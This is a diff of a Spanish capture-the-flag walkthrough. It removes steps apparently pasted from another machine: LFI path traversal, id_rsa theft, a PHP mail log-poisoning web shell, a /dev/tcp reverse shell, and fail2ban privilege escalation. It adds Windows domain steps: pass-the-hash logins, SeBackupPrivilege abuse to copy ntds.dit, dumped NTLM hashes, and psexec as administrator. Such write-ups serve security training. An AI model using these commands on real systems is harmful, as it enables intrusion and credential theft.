@@ -173,6 +173,8 @@ test123$¡
 
 ![contraseña](images/11_cambio_contraseña.png)
 
+- - - 
+
 # 🌐 Salto de usuario
 
 Ahora tenemos control del usuario audit2020.
@@ -205,232 +207,86 @@ netexec winrm 10.129.229.17 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d
 ``` 
 ![pwned](images/15_pwned.png)
 
-
-# 🌐 Enumeración web 3
-
-El subdominio contiene una web que si exploramos vemos una ruta que está contemplada de una manera muy extraña
-Pues hace una llamada a un service.html de esta forma http://preprod-marketing.trick.htb/index.php?page=services.html en vez de esta http://preprod-marketing.trick.htb/services.html.
-
-![web3](images/10_web3.png)
-
-Esto puede significar que hay un LFI
-
-# 🎯 Acceso inicial
-
-## Vulnerabilidad
-
-LFI (Local File Inclusion) es una vulnerabilidad que permite a un atacante incluir y, en algunos casos, ejecutar archivos locales del servidor mediante la manipulación de parámetros de entrada.
-
-Vamos a comprobarla intentando leer el /etc/passwd de la máquina víctima.
+Pone pwned asi que nos podremos conectar al winrm de la siguiente forma.
 
 ```bash
-http://preprod-marketing.trick.htb/index.php?page=/etc/passwd
+evil-winrm -i 10.129.229.17 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
 ```
-
-En este caso no nos reporta nada
-
-![LFI1](images/11_LFI1.png)
-
-Vamos a probar unas técnicas de evasión. Para ello le añadiremos ....//....//....//....//....//....//etc/passwd
-
-```bash
-http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//etc/passwd
-```
-Y en este caso hemos conseguido leer el archivo /etc/passwd.
-
-![passwd](images/19_passwd.png)
-
-Ahora lo que necesitamos es ejecutar remotamente comandos o ganar directamente acceso al sistema.
-Para ello intentaremos robar la clave id_rsa del usuario michael que hemos visto en el archivo /etc/passwd
-
-```bash
-http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa
-```
-
-![id_rsa2](images/20_id_rsa_desord.png)
-
-La vemos pero está desordenada, para ello hacemos un view-source de la url de la siguiente forma
-
-```bash
-view-source:http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa
-```
-Vemos que podemos acceder a ella. Nos la copiaremos en nuestro sistema
-
-![id_rsa](images/12_id_rsa.png)
-
-Ahora le damos permisos de ejecución
-
-```bash
-chmod 600 id_rsa
-```
-Y la utilizamos para ganar acceso al sistema como el usuario michael
-
-```bash
-ssh -i id_rsa michael@<IP>
-```
-
-![ssh](images/13_ssh.png)
-
----
-# Intrusión alternativa
-
-## Vulnerabilidad
-
-Hay otra forma de conseguir la ejecución remota de comandos sin la id_rsa y es mediante el envenenamiento de logs (log poisoning).
-
-El Log Poisoning es una técnica de ataque que permite a un atacante manipular los archivos de registro de una aplicación web para lograr un resultado malintencionado. Esta técnica se puede utilizar en conjunto con una vulnerabilidad LFI para ejecutar comandos remotamente en el servidor.
-
-Aprovechando que tenemos el puerto 25 smtp abierto, vamos a conectarnos a el a traves de telnet.
-
-```bash
-telnet <IP> <PUERTO>
-```
-El ataque va a consistir en enviarle un mail al usuario michael con un payload que nos va a permitir ejecutar comandos a traves del LFI
-
-```txt
--MAIL FROM: usuario cualquiera
--RCPT TO: usuario en el que tengamos el LFI
--DATA
--`<?php system($_GET['cmd']); ?>`
--.
--QUIT
--Tenemos que cerrar el DATA con un .
-```
-![ssh](images/14_telnet.png)
-
-Ahora vamos al navegador y a la siguiente ruta
-
-```bash
-http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//var/mail/michael&cmd=id
-```
-Tenemos que concatenar el &cmd que es el parametro que le hemos puesto al payload en php.
-A priori no vemos nada pero si hacemos un view_source en la url veremos el comando ejecutado correctamente
-
-```bash
-view-source:http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//var/mail/michael&cmd=id
-```
-![rce](images/15_RCE.png)
-
-Ya con esto nos montamos una reverse shell a nuestra máquina host.
-Primero nos ponemos en escucha por el puerto 4444
-
-```bash
-nc -nlvp 4444
-```
- y ahora colocamos el siguiente payload en la url
-
-```bash
-bash -c "bash -i >%26 /dev/tcp/<IP_HOST>/4444 0>%261"
-```
-
-```
-http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//var/mail/michael&cmd=bash -c "bash -i >%26 /dev/tcp/<IP_HOST>/4444 0>%261"
-```
-
-![rev_shell](images/16_reverse_shell.png)
-
-Ya por ultimo haremos un tratamiento de la tty para que la consola no de fallos 
-
-```bash
-script -c bash /dev/null
-```
-Hacemos un ctrl + z para dejarlo en segundo plano
-
-```bash
-stty raw -echo ; fg
-```
-
-```bash
-reset xterm
-```
-
-```bash
-export TERM=xterm
-```
-Ya con esto tenemos acceso al sistema de dos formas diferentes como el usuario michael
-
----
-
-# 🔎 Enumeración interna
-
-## Usuario actual
-
-Hacemos un id para ver a que grupo pertenece michael
-
-```bash
-id
-```
-Y pertenece al grupo michael y security.
-
-Vamos a hacer un sudo -l para ver que permisos tenemos asignados.
-
-```bash
-michael@trick:~/Desktop$ sudo -l
-Matching Defaults entries for michael on trick:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User michael may run the following commands on trick:
-    (root) NOPASSWD: /etc/init.d/fail2ban restart
-```
-Vemos que podemos reiniciar como root el servicio fail2ban
-
-### 🛡️ fail2ban
-Fail2ban es una herramienta de seguridad para servidores Linux que ayuda a proteger tu servidor contra ataques de fuerza bruta. Funciona monitoreando los registros de varios servicios, como SSH, FTP, Apache, entre otros, en busca de intentos de inicio de sesión fallidos. Cuando detecta un número predefinido de intentos fallidos desde la misma dirección IP, bloquea temporalmente esa 
-dirección IP, ya que considera que se están ataques de fuerza bruta. De esta manera dificulta que un atacante continúe con sus intentos de acceso no autorizado.
-
-Vamos a ver si tenemos algun tipo de permisos de escritura en los archivos de configuración del servicio.
-
-Si echamos un vistazo a la ruta /etc/fail2ban veremos que tenemos permisos de escritura en el directorio action.d gracias a que pertenecemos al grupo security.
 
 - - -
+
 # 🚀 Escalada de privilegios
 
-El ataque va a consistir en cambiar el archivo de configuración que se encargue de ejecutar una acción cuando detecte fuerza bruta y colocarle un comando para escalar privilegios
+Hacemos un whoami /priv para listar los privilegios.
+Vemos que tenemos el privilegio **SeBackupPrivilege**
 
-Si investigamos la herramienta encontamos que el archivo que se encarga de eso es el iptables-multiport.conf
-
-Nos lo copiaremos al directorio /tmp
-
-```bash
-cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp
-```
-
-Ahora lo vamos a editar.
-
-La parte que se encarga de las acciones y bloqueos es el actionban.
-Ahi le vamos a poner el comando que va a asignar a la bash permisos SUID para que podamos ejecutar una como root
-
-![iptables-multiport.conf](images/17_archivo_configuración.png)
-
-Ahora solo nos queda moverlo al directorio action.d
+Vamos a crearnos un directorio en C:\ llamado Temp y nos vamos a hacer un backup de system.
 
 ```bash
-mv iptables-multiport.conf /etc/fail2ban/action.d/
+cd C:\
+mkdir Temp
+cd Temp
+reg save HKLM\system system
 ```
-Reiniciamos el servicio
+
+Ahora vamos a hacer una copia del directorio NTDS.
+Para ello nos tenemos que crear una unidad logica llamada por ejemplo z:
+En nuestra máquina local nos vamos a crear un archivo llamado test.txt con el siguiente contenido
+
+```text
+set context persistent nowriters (espacio)
+add volume c: alias prueba (espacio)
+create (espacio)
+expose %prueba% z: (espacio)
+```
+(Tenemos que dejar un espacio detras de cada línea sino no funcionará)
+
+Ahora volvemos a la víctima y lo subimos con upload
 
 ```bash
-/etc/init.d/fail2ban restart
+upload /home/enriquerc/maquina/test.txt
 ```
-Y ahora vamos a intentar iniciarnos por ssh a root de forma fallida muchas veces
-
-```
-ssh root@<IP>
-```
-
-Esto se puede automatizar con hydra
+Ahora usamos la herramienta diskshadow
 
 ```bash
-hydra -u root -P /usr/share/wordlists/rockyou.txt <IP> ssh
+C:\Temp> diskshadow.exe /s c:\Temp\test.txt
 ```
-
-Cuando lo hagamos un rato, hacemos un ls -l de la bash para ver si tiene los permisos suid.
-Vemos que lo tiene asi que terminamos ejecutando una bash con altos privilegios
+Ahora nos podemos crear una copia del ntds.dit en caso de estar en el dominio o la SAM si estamos en un equipo sin dominio.
 
 ```bash
-bash -p
+robocopy /b z:\Windows\NTDS\ . ntds.dit
+```
+Ahora nos descargamos en ntds.dit y el system
+
+```bash
+download C:\Temp\ntds.dit
+download C:\Temp\system
 ```
 
-![root](images/18_root.png)
+Ahora con todos los archivos en el sistema usaremos la herramienta secretsdump para conseguir los hashes del dominio
 
----
+```bash
+$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ebae81f9b7e7135bcc042f2be47f0762:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
+support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+```
+
+Vamos a validar que sea ese con netexec y despues de ver que si es valido podemos entrar por el evil-winrm o con psexec de la siguiente forma
+
+- PSEXEC:
+```bash
+impacket-psexec blackfield.local/administrator@10.129.229.17 -hashes :184fb5e5178480be64824d4cd53b99ee
+```
+
+EVIL-WINRM:
+```
+evil-winrm -i 10.129.229.17 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'
+```
+Ya con esto seremos administradores que equivale a NT/AUTORITY SYSTEM
+
+![pwned](images/16_admin.png)
